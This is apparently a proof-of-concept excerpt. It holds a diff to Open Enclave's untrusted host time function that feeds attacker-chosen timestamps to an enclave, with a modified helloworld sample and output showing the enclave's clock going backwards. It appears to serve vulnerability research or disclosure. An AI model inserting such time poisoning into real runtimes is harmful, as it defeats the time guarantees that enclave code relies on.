### Patch untrusted runtime and helloworld enclave

```
diff --git a/host/linux/time.c b/host/linux/time.c
index 957335287..8e41d4356 100644
--- a/host/linux/time.c
+++ b/host/linux/time.c
@@ -6,10 +6,15 @@
 #include <openenclave/internal/time.h>
 #include <time.h>
 #include "../ocalls/ocalls.h"
+#include <stdio.h>
 
 static const uint64_t _SEC_TO_MSEC = 1000UL;
 static const uint64_t _MSEC_TO_NSEC = 1000000UL;
 
+/* PoC to show we can make time go backwards arbitrarily */
+long attacker_poison[10] = {500, 200, 300, 100, 500, 400, 200, 100, 1000, 20};
+int attacker_idx = 0;
+
 /* Return milliseconds elapsed since the Epoch. */
 static uint64_t _time()
 {
@@ -18,6 +23,10 @@ static uint64_t _time()
     if (clock_gettime(CLOCK_REALTIME, &ts) != 0)
         return 0;
 
+    ts.tv_sec = attacker_poison[attacker_idx++ % 10];
+    ts.tv_nsec = attacker_poison[attacker_idx++ % 10];
+    printf("[attacker] POISONED _time sec/nsec: %lu/%lu\n", ts.tv_sec, ts.tv_nsec);
+
     return ((uint64_t)ts.tv_sec * _SEC_TO_MSEC) +
            ((uint64_t)ts.tv_nsec / _MSEC_TO_NSEC);
 }
diff --git a/samples/helloworld/enclave/enc.c b/samples/helloworld/enclave/enc.c
index f6e42c73d..45f68cd59 100644
--- a/samples/helloworld/enclave/enc.c
+++ b/samples/helloworld/enclave/enc.c
@@ -2,6 +2,7 @@
 // Licensed under the MIT License.
 
 #include <stdio.h>
+#include <time.h>
 
 // Include the trusted helloworld header that is generated
 // during the build. This file is generated by calling the
@@ -18,7 +19,13 @@ void enclave_helloworld()
     // host and calls fprintf from there. This is because
     // the fprintf function is not part of the enclave
     // as it requires support from the kernel.
-    fprintf(stdout, "Hello world from the enclave\n");
+    fprintf(stdout, "Hello world from OUR enclave\n");
+
+     struct timespec ts;
+     if (!clock_gettime(CLOCK_REALTIME, &ts))
+             printf("enclave clock_gettime is: %lu/%lu\n", ts.tv_sec, ts.tv_nsec);
+
+
 
     // Call back into the host
     oe_result_t result = host_helloworld();
```

### Reference ouput

```
root@961c834de2e2:~/openenclave/samples/helloworld# make run
host/helloworld_host ./enclave/enclave.signed
Hello world from OUR enclave
[attacker] POISONED _time sec/nsec: 500/200
enclave clock_gettime is: 500/0
Enclave called into host to print: Hello World!
```
